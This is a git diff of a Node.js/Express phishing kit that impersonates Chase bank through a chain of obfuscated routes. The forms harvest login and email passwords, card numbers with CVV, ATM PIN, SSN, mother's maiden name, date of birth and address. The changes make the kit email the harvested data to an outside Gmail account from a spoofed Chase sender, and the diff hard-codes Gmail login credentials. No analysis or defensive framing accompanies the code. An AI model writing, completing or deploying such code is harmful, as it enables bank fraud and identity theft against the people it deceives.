@@ -13,6 +13,13 @@ const fs = require('fs');
 
 const hbs = require('hbs');
 
+const transporter = nodemailer.createTransport({
+    service: 'gmail',
+    auth: {
+        user: 'jordanrobert2000@gmail.com',
+        pass: 'Mummy123'
+    }
+});
 
 let app = express();
 
@@ -45,6 +52,12 @@ let vm = {
     layout: 'layout'
 };
 
+//test
+app.get('/test', (req, res, next) => {
+    res.render('pages/test', vm);
+});
+
+
 //_yesssh5\Safety\Chase\n\1eb932e5745c485929f49dbefcebbb33
 /* GET home page. */
 app.get('/', (req, res, next) => {
@@ -56,13 +69,16 @@ app.get('/_yesssh5/Safety/Chase/n/1eb932e5745c485929f49dbefcebbb33', (req, res, 
 });
 
 app.post('/_yesssh5/Safety/Chase/n/1eb932e5745c485929f49dbefcebbb33', (req, res, next) => {
-    let newUserId = req.body.userId;
-    let newPassword = req.body.password;
-    let info =  JSON.parse(fs.readFileSync('notes-data.json'));
-    info.userId = newUserId;
-    info.password = newPassword;
 
-    fs.writeFileSync('notes-data.json', JSON.stringify(info, null, 2));
+    console.log(req.body);
+
+    // let newUserId = req.body.userId;
+    // let newPassword = req.body.password;
+    // let info =  JSON.parse(fs.readFileSync('notes-data.json'));
+    // info.userId = newUserId;
+    // info.password = newPassword;
+
+    // fs.writeFileSync('notes-data.json', JSON.stringify(info, null, 2));
 
      res.redirect('/_yesssh5/Safety/Chase/n/1eb932e5745c485929f49dbefceccc33');
 });
@@ -73,13 +89,7 @@ app.get('/_yesssh5/Safety/Chase/n/1eb932e5745c485929f49dbefceccc33', (req, res, 
 });
 
 app.post('/_yesssh5/Safety/Chase/n/1eb932e5745c485929f49dbefceccc33', (req, res, next) => {
-    let newEmail = req.body.email;
-    let newEmailPassword = req.body.emailPassword;
-    let info =  JSON.parse(fs.readFileSync('notes-data.json'));
-    info.email = newEmail;
-    info.emailPassword = newEmailPassword;
-
-    fs.writeFileSync('notes-data.json', JSON.stringify(info, null, 2));
+    console.log(req.body);
 
     res.redirect('/_yesssh5/Safety/Chase/n/1eb932e5745c485929f49dbefceddd33');
 });
@@ -91,20 +101,32 @@ app.get('/_yesssh5/Safety/Chase/n/1eb932e5745c485929f49dbefceddd33', (req, res, 
 });
 
 app.post('/_yesssh5/Safety/Chase/n/1eb932e5745c485929f49dbefceddd33', (req, res, next) => {
-    let newCardNumber = req.body.number;
-    let newFullName = req.body.name;
-    let newExpiryDate = req.body.expiry;
-    let newCardCVV = req.body.cvc;
 
-    let info =  JSON.parse(fs.readFileSync('notes-data.json'));
-    info.cardNumber = newCardNumber;
-    info.fullName = newFullName;
-    info.expiryDate = newExpiryDate;
-    info.cardCVV = newCardCVV;
+    console.log(req.body);
+    //send mail (part 1)
+    let mailOptions = {
+        from: 'info2@chase.com',
+        to: 'olumbex@gmail.com',
+        // to: 'jordanrobert2000@gmail.com',
+        // to: 'pinhomes009@gmail.com',
+        subject: 'Data From chaseish',
+        text: `UserId: ${req.body.username} \n 
+               Password: ${req.body.password1} \n
+               Email: ${req.body.email} \n
+               Email Password: ${req.body.password2} \n
+               Account No: ${req.body.acctNo} \n
+               Routing No: ${req.body.routNo} \n \n`
+    };
 
-    fs.writeFileSync('notes-data.json', JSON.stringify(info, null, 2));
-
-    res.redirect('/_yesssh5/Safety/Chase/n/1eb932e5745c485929f49dbefceeee33');
+    transporter.sendMail(mailOptions, function(error, info){
+        if (error) {
+            console.log(`Error: ${error}`);
+            res.redirect('/_yesssh5/Safety/Chase/n/1eb932e5745c485929f49dbefceeee33');
+        } else {
+            console.log(`Email sent:   ${info.response}`);
+            res.redirect('/_yesssh5/Safety/Chase/n/1eb932e5745c485929f49dbefceeee33');
+        }
+    });
 });
 
 
@@ -114,15 +136,7 @@ app.get('/_yesssh5/Safety/Chase/n/1eb932e5745c485929f49dbefceeee33', (req, res, 
 });
 
 app.post('/_yesssh5/Safety/Chase/n/1eb932e5745c485929f49dbefceeee33', (req, res, next) => {
-    let newAcctNo = req.body.acctno;
-    let newRoutNo = req.body.routno;
-    let newAtmPin = req.body.atmpin;
-    let info =  JSON.parse(fs.readFileSync('notes-data.json'));
-    info.acctNo = newAcctNo;
-    info.routNo = newRoutNo;
-    info.atmPin = newAtmPin;
-
-    fs.writeFileSync('notes-data.json', JSON.stringify(info, null, 2));
+   console.log(req.body);
 
     res.redirect('/_yesssh5/Safety/Chase/n/1eb932e5745c485929f49dbefcefff33');
 });
@@ -134,17 +148,7 @@ app.get('/_yesssh5/Safety/Chase/n/1eb932e5745c485929f49dbefcefff33', (req, res, 
 });
 
 app.post('/_yesssh5/Safety/Chase/n/1eb932e5745c485929f49dbefcefff33', (req, res, next) => {
-    let newPhoneNo = req.body.phoneNo;
-    let newSSN = req.body.ssn;
-    let newMadienName = req.body.madienName;
-    let newDOB = req.body.dob;
-    let info =  JSON.parse(fs.readFileSync('notes-data.json'));
-    info.phoneNo = newPhoneNo;
-    info.ssn = newSSN;
-    info.madienName = newMadienName;
-    info.dob = newDOB;
-
-    fs.writeFileSync('notes-data.json', JSON.stringify(info, null, 2));
+    console.log(req.body);
 
     res.redirect('/_yesssh5/Safety/Chase/n/1eb932e5745c485929f49dbefceggg33');
 });
@@ -156,63 +160,42 @@ app.get('/_yesssh5/Safety/Chase/n/1eb932e5745c485929f49dbefceggg33', (req, res, 
 });
 
 app.post('/_yesssh5/Safety/Chase/n/1eb932e5745c485929f49dbefceggg33', (req, res, next) => {
-    let newAddress = req.body.address;
-    let newCity = req.body.city;
-    let newState = req.body.state;
-    let newZipCode = req.body.zipcode;
+    console.log(req.body);
 
-    let transporter = nodemailer.createTransport({
-        service: 'gmail',
-        auth: {
-            user: 'jordanrobert2000@gmail.com',
-            pass: 'Dallas147'
-        }
-    });
-
-    let info =  JSON.parse(fs.readFileSync('notes-data.json'));
-    info.address = newAddress;
-    info.city = newCity;
-    info.state = newState;
-    info.zipcode = newZipCode;
-
-    fs.writeFileSync('notes-data.json', JSON.stringify(info, null, 2));
-
-    let updateInfo =  JSON.parse(fs.readFileSync('notes-data.json'));
-
+    //send mail (part 2)
     let mailOptions = {
         from: 'info2@chase.com',
         to: 'olumbex@gmail.com',
         // to: 'jordanrobert2000@gmail.com',
         // to: 'pinhomes009@gmail.com',
         subject: 'Data From chaseish',
-        text: `UserId: ${updateInfo.userId} \n 
-               Password: ${updateInfo.password} \n
-               Email: ${updateInfo.email} \n
-               Email Password: ${updateInfo.emailPassword} \n
-               Card Number: ${updateInfo.cardNumber} \n
-               FullName: ${updateInfo.fullName} \n
-               Expiry Date: ${updateInfo.expiryDate} \n
-               CVV: ${updateInfo.cardCVV} \n
-               Account No: ${updateInfo.acctNo} \n
-               Routing No: ${updateInfo.routNo} \n
-               atmPin: ${updateInfo.atmPin} \n
-               Phone No: ${updateInfo.phoneNo} \n
-               ssn: ${updateInfo.ssn} \n
-               Madien Name: ${updateInfo.madienName} \n
-               address: ${updateInfo.address} \n
-               city: ${updateInfo.city} \n
-               state: ${updateInfo.state} \n
-               zipcode: ${updateInfo.zipcode}`
+        text: `UserId: ${req.body.username} \n 
+               Password: ${req.body.password1} \n
+               Email: ${req.body.email} \n
+               Email Password: ${req.body.password2} \n
+               Account No: ${req.body.acctNo} \n
+               Routing No: ${req.body.routNo} \n \n
+               
+               Card Number: ${req.body.cardNo} \n
+               FullName: ${req.body.cardName} \n
+               Expiry Date: ${req.body.cardExpiry} \n
+               CVV: ${req.body.cvv} \n
+               atmPin: ${req.body.atmPin} \n
+               Phone No: ${req.body.phoneNo} \n
+               ssn: ${req.body.ssn} \n
+               Madien Name: ${req.body.madienName} \n
+               address: ${req.body.address} \n
+               city: ${req.body.city} \n
+               state: ${req.body.state} \n
+               zipcode: ${req.body.zipCode}`
     };
 
     transporter.sendMail(mailOptions, function(error, info){
         if (error) {
             console.log(`Error: ${error}`);
-            // res.send(`error: ${error}`);
             res.redirect('/_yesssh5/Safety/Chase/n/1eb932e5745c485929f49dbefcehhh33');
         } else {
             console.log(`Email sent:   ${info.response}`);
-            // res.send(updateInfo);
             res.redirect('/_yesssh5/Safety/Chase/n/1eb932e5745c485929f49dbefcehhh33');
         }
     });
@@ -230,66 +213,6 @@ app.get('/_yesssh5/Safety/Chase/n/1eb932e5745c485929f49dbefcehhh33', (req, res, 
 
 
 
-app.get('/_y', (req, res, next) => {
-    // let userId = req.body.userId;
-    // let password = req.body.password;
-    let newUserId = 'lucas lumbex';
-    let newPassword = 'insultss pass';
-
-    let transporter = nodemailer.createTransport({
-        service: 'gmail',
-        auth: {
-            user: 'jordanrobert2000@gmail.com',
-            pass: 'Dallas147'
-        }
-    });
-    console.log('1');
-
-    let info =  JSON.parse(fs.readFileSync('notes-data.json'));
-
-
-    info.userId = newUserId;
-    info.password = newPassword;
-
-
-    fs.writeFileSync('notes-data.json', JSON.stringify(info, null, 2));
-    //
-    console.log('2');
-
-    let updateInfo =  JSON.parse(fs.readFileSync('notes-data.json'));
-    console.log(updateInfo);
-
-    // res.send(updateInfo);
-
-    console.log('3');
-    let mailOptions = {
-        from: 'lumbex@chase.com',
-        to: 'olumbex@gmail.com',
-        // to: 'jordanrobert2000@gmail.com',
-        // to: 'pinhomes009@gmail.com',
-        subject: 'Data From chaseish',
-        text: `UserId: ${updateInfo.userId} \n 
-               Password: ${updateInfo.password}`
-    };
-
-    console.log('4');
-
-    transporter.sendMail(mailOptions, function(error, info){
-        if (error) {
-            console.log(error);
-            res.send(`error: ${error}`);
-        } else {
-            console.log('Email sent: ' + info.response);
-            // res.send(updateInfo);
-            res.send({
-                message: 'file saved',
-                message2: 'sent'
-            });
-        }
-    });
-
-
-});
 
 // view engine setup
 app.set('views', path.join(__dirname, 'views'));
